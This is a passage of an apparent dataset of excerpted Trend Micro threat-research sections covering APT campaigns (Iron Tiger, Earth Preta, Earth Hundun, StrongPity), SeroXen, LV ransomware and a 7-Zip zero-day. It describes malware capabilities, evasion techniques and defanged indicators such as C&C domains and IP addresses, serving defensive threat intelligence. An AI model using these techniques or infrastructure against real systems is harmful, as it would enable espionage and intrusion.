loader, downloader, RAT and behavioral aspects, we gained insights into the evolution of the techniques employed by Earth Hundun. While the Waterbear and Deuterbear family represent just one facet of the group's arsenal, we believe that continuous refinement of tools will be implemented in other malware for anti-analysis, and detection evasion, particularly in traffic and file handling.", "source": "Trendmicro"}, {"title": "Introduction", "content": "The recent rise of highly sophisticated malware's ability to evade detection through fully undetectable (FUD) capabilities, low-cost financial accessibility, and minimal skill barriers have created a pervasive threat targeting online communities and organizations. One particular malware known as SeroXen has deployed an advanced, fully undetectable (FUD) technique via highly obfuscated batch files to infect victims with hVNC-(Hidden Virtual Network Computing) capable malware.\nThis entry is the second installment of a three-part series featuring BatCloak engine, its iterations, and inclusion in SeroXen malware as the main loading mechanism. The first entry, titled \"The Dark Evolution: Advanced Malicious Actors Unveil Malware Modification Progression,\" looked into the beginnings and evolution of the BatCloak obfuscation engine. The third part of this series, \"SeroXen Mechanisms: Exploring Distribution, Risks, and Impact,\" analyzes the distribution mechanism of SeroXen and BatCloak, including the security impact and insights of FUD batch obfuscation. As of this writing, a quick online search for SeroXen will show top results for an official website and social media and sharing pages with videos on how to use the remote access trojan (RAT) as if it were a legitimate tool. We will go over these dissemination strategies in the subsequent entry.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "In this entry, we include aYara rulethat organizations and security teams can use to detect SeroXen obfuscated batch files. Additionally, here's aPowerShell scriptthat can reveal the final deobfuscated batch file and commands to be run.It is critically important that this PowerShell script be run in an isolated malware sandbox.This script can be used to deobfuscate the SeroXen batch file where security teams can inspect its output file for the PowerShell command to be executed in the deobfuscation routine. By inspecting this deobfuscated payload, the analyst can grab the Key and IV from the PowerShell command to decrypt the final payload.\nOverall, SeroXen is a full-feature remote administration tool (RAT) coded in C# and built using a combination of various open-source projects that work together to generate a FUD payload.Reportshaveemergedof SeroXen being abused for several infections and attacks. We foresee the evolved BatCloak engine at the core of SeroXen's FUD capabilities as the BatCloak obfuscation engine continues to evolve and be used as a FUD tool for future malware attacks.\nIndividuals are strongly advised to adopt a skeptical stance when encountering links and software packages associated with terms such as \"cheats,\" \"hacks,\" \"cracks,\" and other pieces of software related to gaining a competitive edge. Users, developers, gamers, and enthusiasts are also advised to exercise caution when executing batch files obtained from the internet. Additionally, organizations are encouraged to stay vigilant against phishing attacks that might attempt to entice users to download and run batch installers (e.g., scripting and automation of repetitive tasks).\nOrganizations should consider employing a cutting edgemultilayered defensive strategyand comprehensive security solutions, such asTrend Micro\u2122 XDR, that can detect, scan, and block malicious content such as SeroXen and BatCloak across the modern threat landscape. An extended detection and response capability across endpoint, servers, workloads, email, network, cloud, and identity observed from a single platform likeTrend Vision One\u2122\ufe0fcan mitigate these risks by considering adversarial tactics, techniques, and procedures (TTPs) to profile the entirety of a routine. Learn more about how theZero Day Initiative (ZDI)bug bounty program rewards researchers for responsible vulnerability disclosure as well as protects organizations globally and stay up to date on the latestnews regarding mission critical security patches.", "source": "Trendmicro"}, {"title": "Introduction", "content": "In July 2023, Check Pointdiscloseda campaign called SMUGX, which focused on European countries and was attributed to the advanced persistent threat (APT) groupEarth Preta(also known as Mustang Panda and Bronze President). In the same year, we obtained a phishing email targeting the Taiwanese government that contained a piece of customized PlugX malware - the same one used in the SMUGX campaign. As most previous discussions from other researchers focus on the European attacks, we would instead like to shed light on the Asian side of the campaign. After months of investigation, we discovered more SMUGX campaign-related samples targeting not only Taiwan, but also Vietnam, Malaysia, and other Asian countries in 2022 and 2023.\nThis kind of customized PlugX malware has been active since 2022, with related research being published bySecureworks,Recorded Future,Check Point, andLab52. During analysis, we observed that the piece of customized PlugX malware is dissimilar to thegeneral typeof the PlugX malware that contains a completed backdoor command module, and that the former is only used for downloading the latter. Due to its different functionality, we decided to give this piece of customized PlugX malware a new name: DOPLUGS.\nUpon investigation, we found that the DOPLUGS malware uses the KillSomeOne module, a USB worm that was first disclosed by aSophos reportin November 2020. However,an entryfrom January 2020 mentioned a USB worm; this entry was also the first report that analyzed a piece of PlugX malware integrated with KillSomeOne behavior.\nIn this blog entry, we focus on the Earth Preta campaign, providing an analysis of the DOPLUGS malware variant that the group used, including backdoor command behavior, integration with the KillSomeOne module, and its evolution.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "Earth Preta has primarily focused on targeting government entities worldwide, particularly within the Asia-Pacific region and Europe. Based on our observations, we believe Earth Preta tends to use spear-phishing emails and Google Drive links in its attacks.\nWe explained the purpose of the DOPLUGS malware (which we believe has been in use since 2022), one of the primary tools Earth Preta uses to download the general type of the PlugX malware. While hunting for other samples, we discovered a DOPLUGS variant that has KillSomeOne module integration and that can be traced back to 2018. This shows that Earth Preta has been refining its tools for some time now, constantly adding new functionalities and features.\nOver the course of our investigations into Earth Preta's activities, we have observed that the group remains highly active, particularly in Europe and Asia. It is likely that we will hear more from this group in the future, so it is a good idea for security teams to familiarize themselves with how Earth Preta operates.", "source": "Trendmicro"}, {"title": "Introduction", "content": "We noticed a server hosting both a HyperBro sample and a malicious Mach-O executable named \"rshell.\" HyperBro is a malware family used byIron Tiger(also known as Emissary Panda, APT27, Bronze Union, and Luckymouse), an advanced persistent threat (APT) group that has been performing cyberespionage foralmost a decade, and there have been no reports of this group associated with a tool for Mac operating systems (OS). We analyzed the Mach-O sample and found it to be a new malware family targeting the Mac OS platform. We also eventually found samples compiled for the Linux platform that belongs to the same malware family.\nWe noticed that a chat application named MiMi retrieved the rshell executable, an app we came across recently while investigating threat actorEarth Berberoka. We noticed Iron Tiger controlling the servers hosting the app installers of MiMi, suggesting a supply chain attack. Further investigation showed that MiMi chat installers have been compromised to download and install HyperBro samples for the Windows platform and rshell samples for the Mac OS platform. While this was not the first time the technique wasused, this latest development shows Iron Tiger's interest in compromising victims using the three major platforms: Windows, Linux, and macOS.", "source": "Trendmicro"}, {"title": "Targets", "content": "We found 13 different targets while following our sensors' data. The only targeted countries were Taiwan and the Philippines: five targets of HyperBro (four in Taiwan and one in the Philippines). Meanwhile, we found eight targets for rshell: six in Taiwan, one in the Philippines, and one being in Taiwan and the Philippines.\nWhile we were unable to identify all the targets, these targeting demographics demonstrate a geographical region of interest for Iron Tiger. Among those targets, we could only identify one of them: a Taiwanese gaming development company. Interestingly, we found a sample from the Reptile rootkit framework in that same company, as well as network requests to a subdomain that belongs to Earth Berberoka's infrastructure.\nWe also noticed network requests from a Taiwanese IT development company to the subdomaintrust[.]veryssl[.]org, and the subdomaincenter.veryssl[.]orgis a C&C for one of the rshell samples we found. This suggests the company could be compromised by the same threat actor.", "source": "Trendmicro"}, {"title": "Timeline", "content": "June 2021: Oldest Linux rshell sample found \nNovember 2021: Threat actor modified version 2.2.0 of Windows MiMi chat installer to download and execute HyperBro backdoor \nMay 2021: Threat actor modified version 2.3.0 of Mac OS MiMi chat installer to download and execute \"rshell\" backdoor", "source": "Trendmicro"}, {"title": "Attribution", "content": "We attribute this campaign to Iron Tiger for multiple reasons. First, thedlpprem32.dllfile linked to HyperBro shares certain characteristics (specifically imphash, RICH header) with previous samples already attributed to the group. Also, the file names involved in the decoding and loading of HyperBro are similar to those we witnessed during our investigation last year.\nSecond, one of the Linux rshell samples used the IP address 45[.]142[.]214[.]193 as its C&C. In 2020, that IP address had a particular reverse DNS:nbaya0u2[.]example[.]com. During ourOperation DRBControlinvestigation, we found a HyperBro sample that had 138[.]124[.]180[.]108 as its C&C. This second IP address hadnbaya0u1[.]example[.]comas its reverse DNS. However, as the rshell sample was found in 2021, we initially did not find this correlation strong enough to attribute the rshellmalware family to Iron Tiger.\nDespite the fact that same state-sponsored threat actors tend to share their malware tools (such as gh0st, PlugX, and Shadowpad), this is not the case for HyperBro as far as we know. The fact that we found this malware being used in this campaign is an additional indicator pointing towards Iron Tiger.\nWe also found some links to Earth Berberoka. From one of the victims where we found an rshell sample, we also found a binary belonging to theReptile rootkitframework, a rootkit identified as part of the arsenal of Earth Berberoka. We also noticed network communications from this victim to a subdomain of Earth Berberoka, suggesting it could have been previously compromised by this threat actor. We noticed a different system in the same situation, as well as the network connections to the subdomaintrust[.]veryssl[.]orgdomain name. One of the rshell samples hadcenter[.]veryssl[.]orgas the C&C. Both findings suggest that those victims could be compromised by both threat actors, or that Earth Berberoka is actually a subgroup of Iron Tiger. As a reminder, while investigating Earth Berberoka, we found multiple links to Iron Tiger that we detailed in ourresearch.", "source": "Trendmicro"}, {"title": "Introduction", "content": "The Trend Micro research team recently analyzed an infection related to the LVransomwaregroup, aransomware as a service(RaaS) operation that has been active since late 2020, and is reportedly  based onREvil(aka Sodinokibi). The exact nature of the relationship between the LV ransomware and REvil groups cannot be definitively established or verified - the LV ransomware's developers do not appear to have had access to the Revil source code, and likely modified REvil binary script instead. According to previousresearch, the group that operates REvil is said to have either sold the source code, had the source code stolen from them, or shared the source code with the LV ransomware group as part of a partnership. We believe that the threat actor that operates LV ransomware just replaced the configuration of a REvil v2.03 beta version to repurpose the REvil binary for ransomware operations.\nThe group's namesake ransomware has been seeing a reemergence since second quarter of 2022, with our investigation revealing a surge in the number of breaches being undertaken by the ransomware group. Furthermore,an alert issued by the German Federal Office for Information Securityin August 2022  reveals that the ransomware's operators were blackmailing the semiconductor company Semikron by threatening to leak allegedly stolen data.\nIn this blog entry, we will provide details on a recent intrusion performed by a group affiliate that involved the compromise of the corporate environment of a Jordan-based company. In this incident, the attackers used the double-extortion technique to blackmail their victims, threatening to release allegedly stolen data in addition to encrypting the victim's files.", "source": "Trendmicro"}, {"title": "Targets", "content": "In December 2021, we observed a post on a cybercrime forum from a malicious actor claiming to operate the LV ransomware and seeking network access brokers. The malicious actor expressed interest in obtaining network access to Canadian, European and U.S. entities and then monetizing them by deploying the ransomware.\nReported LV ransomware breaches have been increasing since the second quarter of 2022, which aligns with the malicious actor's efforts to expand its affiliates program. The chart shown in figure 3 illustrates this increase in activity.\nBased on data from Trend Micro\u2122 Smart Protection Network\u2122 and other internal sources, Europe was the region with the highest number of breach alerts, while the US and Saudi Arabia were the countries with the highest number of reported incidents caused by the ransomware payload. The attacks spanned multiple industry verticals - with manufacturing and technology being the most affected industries - demonstrating the group's opportunistic approach.", "source": "Trendmicro"}, {"title": "recommendation", "content": "By partnering with threat actors that have access to networks via the underground, the LV ransomware has been able to target multiple regions and industries. This development shows that the impact of a ransomware variant is not solely reliant on the addition of new capabilities, but also on other factors such as a greater reach and better distribution networks.\nRansomware operators commonly employ vulnerability exploitation techniques as part of their routines. Organizations should consider allocating enough resources into regularly patching and updating their infrastructure and software, especially if it involves addressing major vulnerabilities such as ProxyShell. Furthermore, regular auditing and taking inventory of assets and data helps ensure that enterprises are up to date on what is happening within their system. Finally, implementing data protection, backup, and recovery measures ensures that data is not lost even if a successful ransomware infection occurs.\nA multilayered approach can help organizations guard all possible entry points into the system for endpoints, emails, web, and networks. Security technologies that can detect malicious components and suspicious behavior that enterprises can consider include:\nTrend Micro Vision One\u2122, which provides multilayered protection and behavior detection, helping block suspicious behavior and tools before the ransomware can damage the system. \nTrend Micro Cloud One\u2122 \u2013 Workload Security, which protects systems against both known and unknown threats that exploit vulnerabilities. Cloud One uses technologies such as virtual patching and machine learning to further protect an organization from attacks. \nTrend Micro\u2122 Deep Discovery\u2122 Email Inspector, which employs custom sandboxing and advanced analysis techniques to effectively block malicious emails, such as phishing emails that often serve as entry points for ransomware. \nTrend Micro Apex One\u2122, which offers automated threat detection and response against advanced threats such as fileless threats and ransomware.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Update as of April 27, 2021, 7 A.M. E.T.: We've updated the \"Rootkits From a Public Repository\" section and the appendix to include a second sample.\nMore than a year afterOperation DRBControl, a campaign by a cyberespionage group that targets gambling and betting companies in Southeast Asia, we found evidence that the Iron Tiger threat actor is still interested in the gambling industry.\nThis blog details how Iron Tiger threat actors have updated their toolkit with an updated SysUpdate malware variant that now uses five files in its infection routine instead of the usual three. We also provide details on Iron Tiger's possible connections to other threat actors based on similar tactics, techniques, and procedures (TTPs) we've observed.  Finally, we describe some of the rootkits that Iron Tiger is using, one of which is used to hide files at the kernel level, and has not been previously reported as being used by this threat actor.", "source": "Trendmicro"}, {"title": "Targets", "content": "The closer look into Iron Tiger was prompted because of an incident response investigation involving a Philippine-based gambling company that the group targeted. True to form, the Iron Tiger threat actor has targeted the same company for 18 months.\nAside from targeting the same company, Iron Tiger also targeted other countries and industries. Over the past 18 months, we observed how the group targeted governments, banks, telecommunication providers, and even the energy sector in the Middle East and Southeast Asia.", "source": "Trendmicro"}, {"title": "Timeline", "content": "The following timeline shows different samples found in the same gambling company that Talent-Jump and Trend Micro investigated:\nJuly 2019: Operation DRBControl starts \nOctober 2019: OneHyperBromalware sample found \nMarch 2020: New sample of Type 1 malware variant and a rootkit called Pandora found \nApril 2020: One rootkit sample for hiding files processes, files, and services found \nOctober 2020: New HyperBro and Pandora samples found \nDecember 2020: One sample of the SysUpdate malware variant found \nJanuary 2021: Fast Reverse Proxy (FRP) Linux tool found", "source": "Trendmicro"}, {"title": "Conclusion", "content": "This investigation provides more insight into the evolution of Iron Tiger's toolkit and shows the threat actor's persistence after targeting the same company for 18 months, as well as expanding its target base to include other companies and sectors in different countries in the Middle East and Southeast Asia.\nWe detailed how Iron Tiger threat actors have updated their tools, adding new features, and slightly changing their tactics, techniques, and procedures (TTPs), notably by using a rootkit to hide its backdoors. The different campaigns with different versions of the same tools concurrently being used suggest that there might be subgroups for this threat actor, or multiple groups with access to the builders of these tools.\nWe expect to see more cases involving four or five files instead of the usual \"trident\" in the future.\nThe indicators of compromise (IoCs) can be found in thisappendix.", "source": "Trendmicro"}, {"title": "Introduction", "content": "We recently conducted an investigation into a malicious Android malware sample, which we believe can be attributed to theStrongPity APT group, that was posted on the Syrian e-Gov website. To the best of our knowledge, this is the first time that the group has been publicly observed using malicious Android applications as part of its attacks.\nWe first learned about the sample from a thread shared on theMalwareHunterTeam Twitter. Based on the discussion thread, we learned that the shared sample is a trojanized version of the Syrian e-gov Android application that would steal contact lists and collect files with specific file extensions from its victim's device.\nOne response from the threadpointed outthat the malicious APK was likely distributed using a \"watering-hole\"-like technique: the attacker allegedly had compromised the official Syrian E-Gov website and replaced the official Android application file with a trojanized version of the original app. Due to the suspicious nature of this activity, we decided to investigate further.\nThis blog entry will discuss the group's attack tactics, techniques, and procedures (TTPs) in relation to the Android malware and why these activities can be attributed to this threat actor. Furthermore, we will also dive into the threat actor's development progress and identify several other malicious Android malware samples produced by StrongPity. Finally, we will briefly discuss related malware variants, including the second version of the Android trojan, which appears to be a work in progress and includes several testing features.", "source": "Trendmicro"}, {"title": "Attribution", "content": "When we learned how the threat actor repackages benign applications into trojanized variants, we decided to search for similar samples on VirusTotal. We searched for other applications that were repackaged in a similar method and included similar malicious components.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "This investigation has provided evidence to attribute the Android malware sample, which was posted on the Syrian e-Gov website, to the StrongPity threat group. We were also able to identify additional Android trojan files and correlate these malicious Android applications with existing public reports based on their similarities to the threat actor's TTPs and network infrastructure they used.\nAlthough there are no previously known malicious Android applications attributed to the StrongPity group, we strongly believe that the threat actor is in the process of actively developing new malicious components that can be used to target Android platforms.\nWe believe that the threat actor is exploring multiple ways of delivering the applications to potential victims, such as using fake apps and using compromised websites as watering holes to trick users into installing malicious applications. Typically, these websites would require its users to download the applications directly onto their devices. In order to do so, these users would be required to enable installation of the applications from \"unknown sources\" on their devices. This bypasses the \"trust-chain\" of the Android ecosystem and makes it easier for an attacker to deliver additional malicious components.", "source": "Trendmicro"}, {"title": "Introduction", "content": "In September, 2024 the Trend Zero Day Initiative\u2122 (ZDI) Threat Hunting team identified the exploitation of a 7-Zip zero-day vulnerability used in a SmokeLoader malware campaign targeting Ukrainian entities. \nThe vulnerability, CVE-2025-0411, was disclosed to 7-Zip creator Igor Pavlov, leading to the release of a patch in version 24.09 on November 30, 2024. \nCVE-2025-0411 allows the bypassing of Windows Mark-of-the-Web protections by double archiving files, thus preventing necessary security checks and allowing the execution of malicious content. \nThe vulnerability was actively exploited by Russian cybercrime groups through spear-phishing campaigns, using homoglyph attacks to spoof document extensions and trick users and the Windows Operating System into executing malicious files. \nThe vulnerability was likely exploited as a cyberespionage campaign against Ukrainian government and civilian organizations as part of the ongoing Russo-Ukraine conflict. \nWe provide recommendations for organizations to proactively secure their systems. This includes updating 7-Zip to at least version 24.09, implementing strict email security measures, and conducting employee training on phishing (including homoglyph attacks).", "source": "Trendmicro"}, {"title": "Introduction", "content": "On September 25, 2024, theTrend ZDIThreat Hunting team identified a zero-day vulnerability exploited in-the-wild and associated with the deployment of the loader malware known asSmokeLoader. This vulnerability is believed to be used by Russian cybercrime groups to target both governmental and non-governmental organizations in Ukraine, with cyberespionage being the most likely purpose of these attacks as part of the ongoing Russo-Ukrainian conflict. The exploitation involves the use of compromised email accounts and a zero-day vulnerability existing in the archiver tool 7-Zip (CVE-2025-0411), which was manipulated through homoglyph attacks (which we will also define and explain in this blog entry).\nFollowing initial analysis and the development of a proof-of-concept (PoC), we formally disclosed the vulnerability to Igor Pavlov, the creator of 7-Zip, on October 1, 2024. The issue was subsequently addressed, with 7-Zip releasing a patch as part ofversion 24.09on November 30, 2024.\nThis entry will first examine CVE-2025-0411 in a theoretical context, based on the PoC submitted to 7-Zip. Subsequently, we will analyze the real-world exploitation of this vulnerability as a zero-day in active use.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "It is important that everyone using 7-Zip update to7-Zip version 24.09immediately, especially since CVE-2025-0411 has been under active exploitation since at least September 2024, with PoC concepts existing as well.\nThe exploitation of CVE-2025-0411 signifies another instance of a zero-day vulnerability being used in the context of the ongoing cyber front of the Russo-Ukrainian conflict. This situation illustrates the dynamic nature of the current cyber conflict, particularly the employment of advanced zero-day deployment techniques, notably through homoglyph attacks.\nTo the best of our knowledge, this represents the first occasion in which a homoglyph attack has been integrated into a zero-day exploit chain, thereby elevating concerns regarding the progression of such attacks beyond traditional methods such as credential harvesting, phishing, and website spoofing.\nFurthermore, this campaign highlights the need for organizations to enhance their cybersecurity training programs by incorporating an understanding of homoglyph attacks, especially in relation to files, file extensions, and zero-day exploitation rather than limiting the focus to web spoofing alone. The Trend ZDI Threat Hunting team engages in proactive efforts to identify zero-day exploitation in the wild, therefore safeguarding organizations against real-world threats prior to vendor awareness.\nWe'll be back with more findings as we have them. Until then, you can follow the Trend ZDI team onTwitter,Mastodon,LinkedIn, orBlueskyfor the latest in exploit techniques and security patches.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Users in the Middle East are potentially being targeted by threat actors through malware disguised as the Palo Alto GlobalProtect Tool. \nThe malware uses a two-stage infection routine and advanced C&C infrastructure. \nIt infects victims via asetup.exefile while using theInteractshproject for beaconing, communicating with specific hostnames to report infection progress and gather victim information. \nThe malware can execute remote PowerShell commands, download and exfiltrate files, encrypt communications, and bypass sandbox solutions, representing a significant threat to targeted organizations.\nWe came across a sophisticated malware sample employing a two-stage infection process and seemingly originating from the Middle East, that masquerades as a legitimate Palo Alto GlobalProtect tool.\nOne of the more notable aspects of this malware is its use of a command-and-control (C&C) infrastructure that pivots to a newly registered URL (\"sharjahconnect\"; note that Sharjah is one of the emirates of the UAE) designed to resemble a company VPN portal. This disguise not only aids in the initial infiltration but also helps maintain persistent access to compromised networks.\nFurthermore, the malware uses theInteractshproject (a tool primarily designed for penetration testers to verify the success of their exploits) for beaconing purposes. Using this tool, threat actors can trigger connections to hostnames withinInteractsh'soast[.]fun domain. Note that other threat actors such asAPT28have been observedexploitingthis resource. In this case, the threat actor behind the malware used these connections as a beaconing mechanism to track which targets progress through various stages of the infection chain.\nWritten in C#, this malware boasts a range of capabilities, including the ability to execute remote PowerShell commands, download and execute additional payloads, and exfiltrate specific files from the infected machine. These functions highlight the malware's potential to cause significant damage and disruption within targeted organizations.\nAs we examine the technical specifics and the broader implications of this threat, it is important for cybersecurity professionals to stay informed and vigilant. Understanding the nuances of such sophisticated attacks is essential for developing effective defense mechanisms and mitigating potential risks to critical infrastructure and sensitive data.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "The malware sample we examined, which likely targets entities within the Middle East, reveals a sophisticated use of C&C infrastructure and advanced evasion techniques.\nOur findings include the following:\nUsing dynamic C&C infrastructure: The malware pivots to a newly registered URL, \"sharjahconnect\" (likely referring to the UAE emirate Sharjah), designed to resemble a legitimate VPN portal for a company based in the UAE. This tactic is designed to allow the malware's malicious activities to blend in with expected regional network traffic and enhance its evasion characteristics. \nDomain masquerading: By mimicking a familiar regional service, the attackers exploit trust relationships, increasing the likelihood of successful C&C communications. \nGeopolitical targeting: The domain's regional specificity and the origin of the submission suggest a targeted campaign against Middle Eastern entities, possibly for geopolitical or economic espionage. \nUsing newly registered domains: Using fresh domains for C&C activities allows attackers to bypass blacklists and makes attribution more complicated.", "source": "Trendmicro"}, {"title": "Introduction", "content": "In thefirst partof our Water Labbu blog series, we described how the threat actor used the fraudulent websites of other cryptocurrency scammers to steal cryptocurrency. In our second entry in the Water Labbu series, we would like share how the threat actor leveraged a customer support application to compromise scammers and patched the application using malicious code.\nDuring our investigation, we managed to find a staged Cobalt Strike loader on Virus Total (SHA-256:b81edcbf1a0b56d0f401dcfe4a6ae4d293663b42f120e60579353b6aa86bb105) associated with this threat campaign. According to the sandbox behavior report on Virus Total, the loader launched a Cobalt Strike instance that was instructed to report on the infection progress. The collected information was sent to the server, \"linkstometa[.]com,\" which, as mentioned in our first blog entry, was for collecting balance information and delivering cryptocurrency hijacking scripts.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "Water Labbu is a dangerous new threat actor with a complex routine and infrastructure that isn't afraid to leverage the schemes of other scammers for its own ends, exploiting live chat applications on preexisting scam websites that were developed using the ElectronJS framework.\nA key part of the threat actor's routine is the exploitation of a known Chromium vulnerability to target scammers who use an unpatched version of the MeiQia app. Given that users are dealing not only with the original scammer, but with Water Labbu as well, we advise both individuals and organizations to update their applications and systems to the latest secure versions to prevent vulnerable software from being exploited and used in malicious ways.\nRead the first part of our Water Labbu series to learn more about how the threat actor compromises Dapps for their own purposes.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Iron Tiger is an advanced persistent threat (APT) group that has been focused primarily on cyberespionage for more than a decade. In 2022, we noticed that they updated SysUpdate, one of their custom malware families, to include new features and add malware infection support for the Linux platform.\nWe found the oldest sample of this updated version in July 2022. At the time, we attributed the sample to Iron Tiger but had not yet identified the final payload. It was only after finding multiple similar payloads in late October 2022 that we looked further and found similarities with the SysUpdate malware family that had also been updated in 2021. As with the previous version, Iron Tiger had made the loading logic complex, probably in an attempt to evade security solutions.\nThis new version has similar features to the 2021 version, except that the C++ run-time type information (RTTI) classes we previously observed in 2021 had been removed, and that the code structure was changed to use the ASIO C++ asynchronous library. Both changes make reverse engineering the samples longer. We strongly advise organizations and users in the targeted industries to reinforce their security measures to defend their systems and stored information from this ongoing campaign.", "source": "Trendmicro"}, {"title": "Timeline", "content": "These are the key dates for understanding the chronology of Iron Tiger's operations:\nApr. 2, 2022: Registration of the domain name linked to our oldest Windows sample of SysUpdate \nMay 11, 2022: The command and control (C&C) infrastructure was set up. \nJune 8, 2022: While this could have been tampered with, observed compilation date of our oldest Windows sample. \nJuly 20, 2022: Oldest Windows sample gets uploaded to Virus Total \nOct. 24, 2022: Oldest Linux sample gets uploaded to Virus Total\nWe observed that the attacker registered the oldest domain name one month before starting the C&C configuration then waited one more month before compiling the malicious sample linked to that domain name. We think the gap between the two updates allows the attackers to plan their operations accordingly.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "This investigation confirms that Iron Tiger regularly updates its tools to add new features and probably to ease their portability to other platforms, verifying the interest we found from this threat actor for Linux or Mac OS. It also corroborates this threat actor's interest in the gambling industry and the South East Asia region, as we previously noted in2020and2021.\nThis campaign also substantiates the regular usage of chat applications as infection vectors from Iron Tiger. We expect to find further updates of these tools in the future to accommodate other platforms and apps.\nAs an additional warning, we want to highlight that the targeting can be wider than the samples and targeting we have already observed. In 2022, wediscusseda campaign targeting Taiwan and the Philippines that made use of HyperBro samples (detected by Trend Micro as Backdoor.Win32.HYPERBRO.ENC) signed with a stolen Cheetah certificate. The BfV, a German governmental entity, published areportin January 2022 mentioning attacks against German companies with HyperBro samples that were also signed with the same certificate. In October 2022, Intrinsecreportedan incident in a French company also using HyperBro samples matching the structure we described in our 2021investigation. This shows the threat actor is likely to reuse the tools mentioned here in future campaigns that might target different regions or industries in the short and long term. Considering the active campaign and regular developments made on this malware family, organizations are advised to enhance and broaden their current and established security measures, and heighten overall vigilance for possible infection vectors that can be abused by this threat group.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Since 2022, we've been following a series of cyberespionage efforts carried out by multiple groups carried from an old campaign. It combines the collective activities carried out by subgroups of advanced persistent threat (APT) groupEarth Preta(also known asMustang Panda), representing a comprehensive network of operations for gathering sensitive information from various entities. An analysis of their deployments also revealed a level of coordination and collaboration.\nThrough extensive analysis and as of this writing, we discovered over 200 victims, leading to a wider intelligence analysis of the groups' goals, different operation groups, and tactics, techniques, and procedures (TTPs). Our study aimed at understanding the different phases and facets involved in this operation, shedding light on the motives and techniques used by Earth Preta to provide valuable insights and aid in the development of effective countermeasures.", "source": "Trendmicro"}, {"title": "findings", "content": "While not exhaustive of the entire study's findings due to security and confidentiality concerns, we determined the following findings key to the entire research:\nA hierarchical structure.Earth Preta has a centralized development unit that produces the implants and tools, and disseminates them to other operational groups responsible for penetration and implantation. This is evident in the Earth Preta group as it appears that multiple sub-operational groups use the same toolset with different techniques. \nA management of expertise.The different operational groups manage their own methods of entry and privilege escalation, demonstrating a high degree of specialization within each group. \nA change in targets.Towards the end of 2022, there were changes in how information was collected. The latest active targets were related to maritime, shipping, border control, and immigration agencies. Prior to this shift, most of the data collection efforts were aimed at academic institutions, ore and material refineries, specialized fabrication plants, financial institutions, and energy production and distribution.\nThese key findings can help intelligence communities and decision-makers in understanding Earth Preta's capabilities, objectives, and impact on international security and intellectual property. With this entry, we hope to emphasize the importance of international cooperation in combating this significant threat.", "source": "Trendmicro"}, {"title": "findings", "content": "We found that some operational part of the collective group were focused on stealing intellectual property and sensitive business information, while others targeted government and diplomatic entities. We also found the operations having specific geographical regions for which they tailored their collection requirements.\nWe used a qualitative approach to identify the collection requirements, methods, and objectives of the operational groups and their respective places in the organization. We established links between the operational threat groups by grouping overlaps in victimology and identifying core indicators, such as implants or payloads.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "We deem the findings of this research on Earth Preta's cyberespionage operations have significant implications for international security and intellectual property. There are strong indications of intertwined traditional intelligence tradecraft and cyber collection efforts, indicative of a highly coordinated and sophisticated cyberespionage operation. We identified several distinct operational groups, each with unique TTPs and objectives, which reveals a highly specialized and organized cyberespionage operation.\nThis study also suggests that Earth Preta's cyberespionage operations have a broad reach and have the capacity to target high value targets. The shift in collection priorities toward intelligence regarding specific areas also indicates that Earth Preta is targeting critical infrastructure and key institutions that can affect national and international relations, economies, and securities.\nGiven the scale and sophistication of Earth Preta's cyberespionage operations, the international community needs to take proactive measures to defend against this significant threat. This includes robust cybersecurity measures, effective countermeasures against cyberespionage, and increased international cooperation in combating this threat. The international community must raise awareness on the threats posed by Earth Preta's cyberespionage operations, promote information sharing, and develop effective countermeasures. It is essential to have a coordinated response to this threat, with the support of the private sector, academia, and civil society, to ensure the safety and security of critical infrastructure and intellectual property.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Last year, we shared information on the differences between red team exercises and how organizations may get benefits from each type of activity. External red teaming, assumed breach, and purple teaming each have distinct characteristics that can influence which exercise is suitable for an organization's requirements.Regular execution is essentialto validate and improve the security framework, including individuals, procedures, and technologies.\nAccording to The SANS Institute, \"ransomware attacks continue to pose a growing danger to all companies, with both existing and new criminal groups on the rise.\"\nSince 2021,Trend Micro has published a series of spotlightsoffering threat information on the most infamous ransomware families used in threat actor activities. Ransomware gangs have collaborated and evolved to exacerbate the harm to businesses using ransomware as a service (RaaS) and double extortion tactics.\nWe will examine common tactics, techniques, and procedures (TTPs) in more depth by analyzing an external red teaming exercise as a case study.", "source": "Trendmicro"}, {"title": "Targets", "content": "Attacks differ among organizations, as do the goals of the threat actors. This is why \"organization data\" is now considered one of the most vital resources. Attackers frequently exploit networks to extract valuable data for double extortion or other illicit purposes. This underscores the importance of assessing your tools, procedures, and team's readiness through a Red Team exercise. Ensuring preparedness can significantly improve your ability to withstand and mitigate common attacks effectively.", "source": "Trendmicro"}, {"title": "Introduction", "content": "Earth Hundun is a cyberespionage-motivated threat actor that has been active for several years in the Asia-Pacific region, targeting the technology and government sectors. \nThe group has been known for employing several tools and techniques, including Waterbear, a malware entity that has had over 10 versions since 2009. \nWaterbear is known for its complexity, as it uses a number of evasion mechanisms to minimize the chance of detection and analysis. Succeeding versions have added enhancements that make it even more troublesome to deal with. \nIn 2022, Earth Hundun began using the latest version of Waterbear - also known as Deuterbear - which has several changes, including anti-memory scanning and decryption routines, that make us consider it a different malware entity from the original Waterbear. \nOur blog entry provides an in-depth analysis of these two malware types in Earth Hundun's bag of tools.", "source": "Trendmicro"}, {"title": "Introduction", "content": "We recently observed a surge in cyberattacks targeting a number of organizations in various sectors such as technology, research, and government.  These attacks involve a malware family known as  Waterbear that is linked to the cyberespionage group Earth Hundun (also known asBlackTech), a threat actor that focuses on gathering intelligence from technology and government organizations, particularly in the Asia-Pacific region.\nAmong the group's arsenal of weapons, the Waterbear backdoor is one of the most complex, with a wide array of anti-debug, anti-sandbox, and general antivirus-hindering techniques. Moreover, the frequent updates from its developers have led to even more evasion tactics, including enhancements of its loader, downloader, and communication protocol. This report will delve into the latest techniques Earth Hundun has implemented with Waterbear and provide an analysis of its latest iteration, Deuterbear.", "source": "Trendmicro"}, {"title": "Conclusion", "content": "Since 2009, Earth Hundun has continuously evolved and refined the Waterbear backdoor, as well as its many variants and 